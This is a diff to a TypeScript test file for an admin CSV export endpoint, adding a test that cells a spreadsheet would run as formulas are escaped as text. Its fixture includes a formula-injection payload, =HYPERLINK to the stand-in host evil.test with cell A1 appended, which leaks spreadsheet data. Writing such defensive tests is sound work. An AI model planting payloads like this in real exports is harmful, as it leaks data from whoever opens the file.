@@ -29,6 +29,8 @@ const TOTAL = 100_000;
 const cursorLog = { opened: [] as { sql: string; options: unknown }[], batchesRead: 0, closed: 0 };
 let failAfterBatches: number | undefined;
 let refuse: Error | undefined;
+/** Notes for rows past the first, by id: null unless a test sets one. */
+let notes: Record<string, string> = {};
 
 function fakeCursor(): SqlCursor {
     let next = 0;
@@ -43,7 +45,7 @@ function fakeCursor(): SqlCursor {
             cursorLog.batchesRead++;
             const rows = Array.from({ length: BATCH }, (_, index): (string | null)[] => {
                 const id = String(next + index + 1);
-                return [id, id === "1" ? "say \"hi\", twice\nthen stop" : null, id];
+                return [id, id === "1" ? "say \"hi\", twice\nthen stop" : notes[id] ?? null, id];
             });
             next += BATCH;
             return rows;
@@ -132,6 +134,7 @@ afterEach(() => {
     cursorLog.closed = 0;
     failAfterBatches = undefined;
     refuse = undefined;
+    notes = {};
 });
 
 async function post(app: Hono, body: unknown, token?: string): Promise<Response> {
@@ -201,6 +204,21 @@ describe("downloading a query's result as an admin", () => {
         expect(records[2]).toBe("2,,2");
         expect(text.endsWith(`${TOTAL},,${TOTAL}\r\n`)).toBe(true);
         expect(cursorLog.closed).toBe(1);
+    });
+
+    it("writes a cell a spreadsheet would run as a formula as text, as the CMS export does", async () => {
+        // A display name of `=HYPERLINK(…)` downloaded from the console ran in
+        // Excel or Sheets on open; the same row exported from the CMS did not.
+        notes = { "2": "=HYPERLINK(\"https://evil.test/?\"&A1,\"click\")", "3": "@SUM(A1)", "4": "-12.5", "5": "+1+1" };
+        const app = await boot();
+        const res = await post(app, { sql: "SELECT * FROM users" }, await generateAccessToken("admin-1", ["admin"]));
+        const records = (await res.text()).split("\r\n");
+
+        expect(records[2]).toBe("2,\"'=HYPERLINK(\"\"https://evil.test/?\"\"&A1,\"\"click\"\")\",2");
+        expect(records[3]).toBe("3,'@SUM(A1),3");
+        // A signed number stays a number.
+        expect(records[4]).toBe("4,-12.5,4");
+        expect(records[5]).toBe("5,'+1+1,5");
     });
 
     it("answers the database's refusal of the query as an error, before any of the file", async () => {
